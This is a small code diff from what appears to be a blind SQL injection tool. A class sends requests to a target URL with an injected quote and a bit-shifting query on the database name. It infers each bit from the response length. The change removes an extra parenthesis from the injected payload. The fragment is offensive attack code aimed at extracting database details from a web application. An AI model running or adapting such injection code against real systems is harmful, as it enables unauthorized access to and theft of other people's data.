@@ -23,7 +23,7 @@ class GetDbTableInformationClass:
         for shift_idx in range(7, -1, -1):
             res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                       bitwise_public.DATA_LENGTH_SHIFT_QUERY.format('db_name()',
-                                                                                                    shift_idx) + ')'))
+                                                                                                    shift_idx)))
                              .text)
             length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
